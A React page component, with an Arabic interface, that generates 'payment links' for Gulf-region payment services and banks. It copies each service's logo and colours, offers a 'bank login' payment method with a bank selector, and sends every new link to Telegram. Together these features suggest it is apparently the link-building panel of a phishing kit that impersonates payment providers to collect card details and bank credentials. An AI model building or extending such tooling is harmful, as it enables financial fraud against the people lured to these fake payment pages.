import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getPaymentServicesByCountry } from "@/lib/gccPaymentServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const paymentServices = getPaymentServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [paymentRef, setPaymentRef] = useState("");
  const [paymentDescription, setPaymentDescription] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  // Get selected service details and branding
  const selectedServiceData = useMemo(() =>
    paymentServices.find(s => s.key === selectedService),
    [paymentServices, selectedService]
  );

  const serviceBranding = useMemo(() => {
    if (!selectedService) return null;
    // Use custom branding for payment services
    return {
      logo: selectedServiceData?.logo || "",
      colors: {
        primary: selectedServiceData?.color || countryData?.primaryColor || "#0EA5E9",
        secondary: countryData?.secondaryColor || "#06B6D4"
      },
      description: selectedServiceData?.description || `خدمة ${selectedServiceData?.nameAr}`
    };
  }, [selectedService, selectedServiceData, countryData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !paymentRef) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.nameAr || selectedService,
          payment_reference: paymentRef,
          payment_description: paymentDescription,
          payment_amount: parseFloat(paymentAmount) || 500,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      // Send data to Telegram with image and description
      const telegramResult = await sendToTelegram({
        message: `🔔 رابط سداد جديد\n\n🏢 الخدمة: ${selectedServiceData?.nameAr}\n💰 المبلغ: ${formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}\n🆔 المرجع: ${paymentRef}\n\n🌍 الدولة: ${countryData?.nameAr}\n\n🔗 الرابط: ${paymentUrl}`,
        linkUrl: paymentUrl,
        imageUrl: serviceBranding?.logo || "",
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(createdPaymentUrl);
      setCopied(true);
      toast({
        title: "تم النسخ!",
        description: "تم نسخ رابط السداد إلى الحافظة",
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({
        title: "خطأ",
        description: "فشل في نسخ الرابط",
        variant: "destructive",
      });
    }
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Payment Service Selection */}
              <div>
                <Label className="mb-2 text-sm">خدمة السداد *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة السداد" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {paymentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.nameAr}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img
                        src={serviceBranding.logo}
                        alt={selectedServiceData.nameAr}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
                      <p className="text-xs text-muted-foreground">{selectedServiceData.category}</p>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                </div>
              )}

              {/* Payment Reference */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم أو مرجع الدفع *
                </Label>
                <Input
                  value={paymentRef}
                  onChange={(e) => setPaymentRef(e.target.value)}
                  placeholder="مثال: INV-12345, PAY-67890"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Payment Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" />
                  وصف الدفع
                </Label>
                <Input
                  value={paymentDescription}
                  onChange={(e) => setPaymentDescription(e.target.value)}
                  placeholder="مثال: رسوم خدمات، اشتراك، فاتورة"
                  className="h-9 text-sm"
                />
              </div>

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ السداد
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    {selectedServiceData?.category === 'bank' && (
                      <SelectItem value="bank_login">
                        <div className="flex items-center gap-2">
                          <Building2 className="w-4 h-4" />
                          <span>الدفع المصرفي</span>
                        </div>
                      </SelectItem>
                    )}
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Selection (only if bank_login selected) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 text-sm">اختر البنك *</Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          {bank.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              <Button
                type="submit"
                size="lg"
                className="w-full h-11 text-white mt-6"
                style={{
                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
                }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
              </Button>
            </form>
          </Card>
        </div>

        {/* Success Dialog */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="sm:max-w-md" dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
              <AlertDialogDescription className="text-right">
                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="my-4">
              <Label className="text-sm font-semibold">رابط السداد</Label>
              <div className="flex items-center gap-2 mt-2">
                <Input
                  value={createdPaymentUrl}
                  readOnly
                  className="text-sm h-10 font-mono"
                />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={copyToClipboard}
                  className="shrink-0"
                >
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
              <p className="text-xs text-muted-foreground mt-2">
                {copied ? "✓ تم النسخ" : "انقر لنسخ الرابط"}
              </p>
            </div>
            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
              <Button
                variant="outline"
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة الرابط
              </Button>
              <AlertDialogAction
                onClick={() => {
                  setShowSuccessDialog(false);
                  navigate('/services');
                }}
                className="flex-1"
              >
                إنشاء رابط آخر
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      </div>
    </div>
  );
};

export default CreatePaymentLink;
